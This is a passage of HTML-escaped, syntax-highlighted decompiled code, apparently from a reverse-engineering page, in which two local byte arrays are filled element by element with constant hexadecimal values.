&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9d
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x67
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x38
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x77
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x60&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf3
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x60&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9c
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x61&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa8
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x61&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf7
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x62&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x55
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x62&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x39
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;99&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x65
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;99&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x15
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x74
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x65&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa7
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x65&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd5
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x66&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x87
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x66&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe9
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x67&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcb
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x67&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x94
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x68&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x89
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x68&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe8
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x69&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1d
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x69&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7f
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcf
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa0
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd1
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa4
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1b
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6f
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x79
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x26
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe7
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x86
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7d
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x70&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x70&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x28
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x71&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf0
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x71&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9f
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x72&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xfb
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x72&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x96
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x73&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x73&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x68
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x74&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4a
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x74&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3e
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x75&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x45
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x75&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2c
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x76&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x76&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x69
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x77&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x74
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x77&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x78&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcd
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x78&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x92
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x79&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x79&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x98
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf0
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x62
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaa
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd9
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5b
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7e
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x70
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x22
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4d
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x81&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x11
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x81&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x72
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x82&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x82&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf9
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x83&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x72
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x83&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x84&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x84&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4d
